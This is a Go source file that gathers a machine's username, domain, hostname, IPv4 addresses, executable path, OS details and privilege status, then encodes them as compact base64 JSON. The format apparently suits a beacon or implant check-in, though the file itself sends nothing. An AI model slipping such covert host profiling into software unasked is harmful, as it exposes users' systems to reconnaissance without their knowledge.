package metadata

import (
	"encoding/base64"
	"encoding/json"
	"log"
	"net"
	"os"
	"os/user"
	"strings"
)

type Metadata struct {
	Username string   `json:"u,omitempty"`
	Hostname string   `json:"h,omitempty"`
	Domain   string   `json:"d,omitempty"`
	IPs      []string `json:"i,omitempty"`
	OSMeta   string   `json:"om,omitempty"`
	ProcName string   `json:"pn,omitempty"`
	IsPriv   bool     `json:"ip,omitempty"`
	Extra    string   `json:"e,omitempty"`
}

func GetMetadata() (string, error) {
	metadata := &Metadata{
		Hostname: getHostname(),
		OSMeta:   getOSMeta(),
		IPs:      getIPs(),
		ProcName: getProcName(),
		IsPriv:   isPrivileged(),
	}
	metadata.Domain, metadata.Username = getUsername()

	log.Printf("Username: %s", metadata.Username)
	log.Printf("Hostname: %s", metadata.Hostname)
	log.Printf("Domain: %s", metadata.Domain)
	log.Printf("OSMeta: %s", metadata.OSMeta)
	log.Printf("IPs: %v", metadata.IPs)
	log.Printf("ProcName: %s", metadata.ProcName)
	log.Printf("IsPriv: %t", metadata.IsPriv)

	encoded, err := encodeMetadata(metadata)
	if err != nil {
		return "", err
	}
	log.Printf("Metadata: %s", encoded)
	return encoded, nil
}

func encodeMetadata(metadata *Metadata) (string, error) {
	json, err := json.Marshal(metadata)
	if err != nil {
		return "", err
	}

	return base64.RawStdEncoding.EncodeToString(json), nil
}

func getUsername() (domain string, username string) {
	u, err := user.Current()
	if err != nil {
		return "", "<unknown>"
	}

	split := strings.SplitN(u.Username, "\\", 2)
	if len(split) > 1 {
		domain = split[0]
		username = split[1]
	} else {
		username = u.Username
	}

	return domain, username
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "<unknown>"
	}
	return hostname
}

func getIPs() []string {
	interfaces, err := net.InterfaceAddrs()
	if err != nil {
		return []string{}
	}

	var ips []string
	for _, iface := range interfaces {
		if ipnet, ok := iface.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.String())
			}
		}
	}

	return ips
}

func getProcName() string {
	proc, err := os.Executable()
	if err != nil {
		return "<unknown>"
	}
	return proc
}
